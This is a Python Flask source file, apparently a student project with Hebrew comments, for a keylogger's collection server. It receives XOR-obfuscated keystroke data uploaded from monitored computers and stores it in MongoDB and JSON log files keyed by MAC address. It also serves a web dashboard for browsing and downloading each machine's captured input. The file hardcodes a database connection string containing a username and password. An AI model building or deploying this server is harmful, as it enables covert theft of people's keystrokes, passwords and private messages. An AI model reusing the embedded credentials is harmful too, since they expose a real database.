from flask import Flask, request, render_template, redirect, url_for, jsonify,send_from_directory
from flask_cors import CORS
from pymongo import MongoClient
from encryptor import Encryptor
from special_keys import SpecialKeys
import os
import time
import json

app = Flask(__name__)
CORS(app)

class Users:

    def __init__(self):
        self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
        self.client = MongoClient(self.CONNECTION_STRING)
        self.DB = self.client["KeyLoggerProject"]
        self.collection = self.DB["UsersDatabase"]

    def verify_user(self,user_name,password) -> bool:
        if self.collection.find_one({user_name : password}):
            return True
        return False


class App:

    def __init__(self,mongo_link):
        self.CONNECTION_STRING = mongo_link
        self.client = MongoClient(self.CONNECTION_STRING)
        self.DB = self.client["KeyLoggerProject"]
        self.collection = self.DB["computers"]
        self.computer_connection = {}
        # self.path = "..\\server\\backend\\data"
        self.path = os.path.join("..","server","backend","data")

    def get_computers_list(self):
        #קבלת רשימה של כל המחשבים
        computer_list =self.collection.find({},{"mac_name" : 1,"_id" : 0})
        computer_list = [computer["mac_name"] for computer in computer_list]

        #ניהול חיבור בין שם מחשב למידע
        self.computer_connection = {f"computer{i}" : computer_list[i] for i in range(len(computer_list))}

        #החזרת רשימה של כל שמות המחשבים
        return list(self.computer_connection.keys())

    def get_computer_details(self,computer_name) -> dict:
        #בדיקה האם קיים מחשב זה
        if computer_name not in self.computer_connection:
            return None
        #קבלת המידע של המחשב הזה
        data = self.collection.find_one({"mac_name" : self.computer_connection[computer_name]}, {"_id" : 0})

        #החזרת המידע
        return dict(data if data else {})

    def add_computer(self,data:dict):
        if self.collection.find_one({"mac_name" :data["mac_name"]}) is not None:
            self._update_computer_details(data)
            return

        data["data"] = [data["data"]]
        insert_id = self.collection.insert_one(data).inserted_id

        return insert_id

    def _update_computer_details(self,data:dict):
        self.collection.update_one(
            {"mac_name" : data["mac_name"]},
            {"$push" : {"data" : data["data"]}}
        )

    def save_in_json(self,data):
        try:
            #יצירת נתיב לתיקייה בשביל המחשב
            folder_path = os.path.join(self.path,data["mac_name"].replace(":","_"))
            #יצירת תיקייה למחשב אם אין
            os.makedirs(folder_path,exist_ok= True)
            #יצירת נתיב לקובץ json
            file_path = os.path.join(folder_path,"log_" + time.strftime("%Y_%m_%d_%H_%M")) + ".json"

            #פתיחת הקובץ והכנסת כל הנתונים בפנים
            with open(file_path,'w',encoding='utf-8') as file:
                json.dump(data,file,indent=4,ensure_ascii=False)

            #החזרת תשובה האם הצליח או לא
            return True
        except Exception as e:
            print(e)
            return False





@app.route('/')
def home():
    return render_template("home.html")

@app.route("/api/upload",methods=["POST"])
def upload():

    # קבלת הנתונים שהמחשב שלך
    data = request.get_json()

    # ניהול שגיאות
    if error_manager(data):
        return jsonify({"message": data})

    # יצירת אוביקט של הצפנה
    decryptor = Encryptor()

    # להחזיר את ההצפנה למתונים המקוריים
    data = decryptor.xor(data)

    # הוספת המחשב לDB
    manager.add_computer(data)

    #הוספת הנתונים לזיכרון בתור json
    print(manager.save_in_json(data))

    # החזרת תשובה
    return jsonify({"message": "continue"})

def error_manager(data:dict) -> bool:
    #אם לא התקבל ערך
    if not data:
        return True
    return False

@app.route("/user_verification",methods= ["POST"])
def user_verification():

    #קבלת הנתונים מהform
    user_name = request.form.get("username")
    password = request.form.get("password")

    #בדיקת הנתונים מול הדאטה בייס
    response = users.verify_user(user_name,password)

    #שליחת תשובה לפרונט
    if response:
        return redirect(url_for("computers"))
    else:
        return render_template("/templates/home.html")

@app.route("/computers")
def computers():
    return render_template("computers.html")

@app.route("/computers/get_computers_list",methods=["get"])
def get_computers_list():
    #קבלת רשימת המחשבים מהדאה בייס
    list_of_computer = manager.get_computers_list()

    #החזרת המחשבים לפרונט
    return jsonify({"list_of_computer" : list_of_computer})

@app.route("/computers/<computer>",methods=["GET"])
def get_computer_details(computer):
    #קבלת הנתונים של המחשב מהמחלקה
    data = manager.get_computer_details(computer)

    #בדיקה שקיבל מידע
    if not data:
        return "ERROR:not found",404

    #עיבוד הנתונים לפני הצגה
    data["data"] = process.process_list_of_data(data["data"])

    #יצירת שם הנתיב של קבצי המחשב
    folder_path = os.path.join(manager.path,data["mac_name"].replace(":","_"))
    #יצירת רשימה של כל הקבצים
    list_of_files = os.listdir(folder_path)
    list_of_files = [data["mac_name"].replace(":","_") + "\\" + file for file in list_of_files]

    #יצירת מילון עם כל הרשימה
    data_list = {"links" : list_of_files}


    #החזרת הדף כולל הנתונים
    return render_template("/computer_information.html",
                           computer=computer,computer_data = data,data_list=data_list)

@app.route("/download/<folder>/<path:file_path>",methods=["GET"])
def download_file(folder,file_path):
    #יצירת נתיב לתיקיית הקובץ
    folder = os.path.join("..\\server\\backend\\data",folder)

    #החזרת הקובץ הנדרש
    return send_from_directory(folder,file_path,as_attachment=True)


if __name__ == '__main__':
    mongo_link = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
    users = Users()
    manager = App(mongo_link)
    process = SpecialKeys()
    app.run(debug=True)

